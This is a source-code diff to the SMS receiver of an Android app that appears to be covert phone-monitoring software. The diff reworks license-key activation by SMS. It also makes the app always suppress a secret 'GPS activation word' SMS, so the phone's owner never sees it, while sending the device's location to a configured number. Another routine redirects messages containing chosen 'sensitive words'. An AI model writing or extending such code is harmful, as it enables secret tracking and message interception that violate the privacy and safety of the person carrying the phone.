@@ -16,6 +16,7 @@ import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.LangUtil;
+import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
 import com.particle.inspector.common.util.sms.AUTH_SMS_TYPE;
 import system.service.feature.sms.SmsCtrl;
@@ -111,21 +112,11 @@ public class SmsReceiver extends BroadcastReceiver
 
 				// If it is a full key or part key
 				else {
-					// Save license key info to SharedPreferences
-					if (!ConfigCtrl.setLicenseKey(context, smsBody)) {
-						Log.e(LOGTAG, "Cannot set license key");
-					}
-
-					if (!ConfigCtrl.setLicenseType(context, licType)) {
-						Log.e(LOGTAG, "Cannot set license type");
-						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
-						return;
-					}
-
 					// If it has not been validated by server, send SMS to server for license key validation, 
 					// but still show the setting view for inputing mail address and etc.
 					// The functions will really work until the response validation SMS comes from server. 
-					if (ConfigCtrl.getLicenseType(context) == LICENSE_TYPE.NOT_LICENSED) 
+					LICENSE_TYPE currentLicType = ConfigCtrl.getLicenseType(context);
+					if (currentLicType == LICENSE_TYPE.TRIAL_LICENSED || currentLicType == LICENSE_TYPE.NOT_LICENSED) 
 					{
 						// Make sure the 2G/3G mobile networks available for sending/receiving validation SMS
 						if (!DeviceProperty.isMobileConnected(context)) {
@@ -133,15 +124,7 @@ public class SmsReceiver extends BroadcastReceiver
 							return;
 						}
 
-						String deviceID = DeviceProperty.getDeviceId(context);
-						String phoneNum = DeviceProperty.getPhoneNumber(context);
-						String phoneModel = DeviceProperty.getDeviceModel();
-						String androidVer = DeviceProperty.getAndroidVersion();
-						LANG lang = DeviceProperty.getPhoneLang();
-						AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
-						String smsStr = sms.clientSms2Str();
-						String srvAddr = context.getResources().getString(R.string.srv_address).trim();
-						boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
+						boolean ret = SmsCtrl.sendAuthSms(context, smsBody);
 						if (ret) {
 							SysUtils.messageBox(context, context.getResources().getString(R.string.msg_auth_sms_sent_success));
 							ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
@@ -180,8 +163,13 @@ public class SmsReceiver extends BroadcastReceiver
 					// --------------------------------------------------------------
 					if (parts[3].equals(SmsConsts.SUCCESS)) {
 						// Save self phone number
-						ConfigCtrl.setSelfPhoneNum(context, parts[2].trim());
-
+						if (ConfigCtrl.getSelfPhoneNum(context) == null) {
+							ConfigCtrl.setSelfPhoneNum(context, parts[2].trim());
+						}
+						
+						// Save license key to SharedPreferences
+						ConfigCtrl.setLicenseKey(context, parts[1]);
+						
 						// Save license type info to SharedPreferences
 						LICENSE_TYPE type = LicenseCtrl.calLicenseType(context, parts[1]);
 						if (!ConfigCtrl.setLicenseType(context, type)) {
@@ -191,9 +179,15 @@ public class SmsReceiver extends BroadcastReceiver
 						}
 
 						// Save consumed datetime if it is the 1st activation
+						Date now = new Date();
 						if (ConfigCtrl.getConsumedDatetime(context) == null) {
-							ConfigCtrl.setConsumedDatetime(context, (new Date()));
+							ConfigCtrl.setConsumedDatetime(context, now);
 						}
+						
+						ConfigCtrl.setLastActivatedDatetime(context, now);
+						
+						// Necessary to force reboot to make key effective?
+						// TODO
 					} else if (parts[3].equalsIgnoreCase(SmsConsts.FAILURE)) {
 						if (parts.length >= 4) {
 							SysUtils.messageBox(context, parts[3]);
@@ -257,14 +251,12 @@ public class SmsReceiver extends BroadcastReceiver
 			// Send GPS position if being triggered by GPS activation word
 			else if (BootService.gpsWord != null && 
 				BootService.gpsWord.length() > 0 && 
-				smsBody.contains(BootService.gpsWord)) 
+				smsBody.equalsIgnoreCase(BootService.gpsWord)) 
 			{
 				if (!ConfigCtrl.isLegal(context)) return;
 
-				if (!GlobalPrefActivity.getDisplayGpsSMS(context)) {
-					abortBroadcast();
-				}
-
+				abortBroadcast(); // Do not show location activation SMS
+				
 				String phoneNum = GlobalPrefActivity.getReceiverPhoneNum(context);
 				if (phoneNum.length() > 0) {
 					if (BootService.locationUtil == null) {
@@ -284,7 +276,7 @@ public class SmsReceiver extends BroadcastReceiver
 	private boolean containSensitiveWords(Context context, String sms) {
 		boolean ret = false;
 		String[] sensitiveWords = GlobalPrefActivity.getSensitiveWords(context)
-									.replaceAll(" {2,}", GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
+									.replaceAll(RegExpUtil.MULTIPLE_BLANKSPACES, GlobalPrefActivity.SENSITIVE_WORD_BREAKER) // Remove duplicated blank spaces
 									.split(GlobalPrefActivity.SENSITIVE_WORD_BREAKER);
 		if (sensitiveWords.length == 0) return false; // We only redirect SMS that contains sensitive words intead of redirecting all. 
 		int count = sensitiveWords.length > GlobalPrefActivity.MAX_SENSITIVE_WORD_COUNT ? 
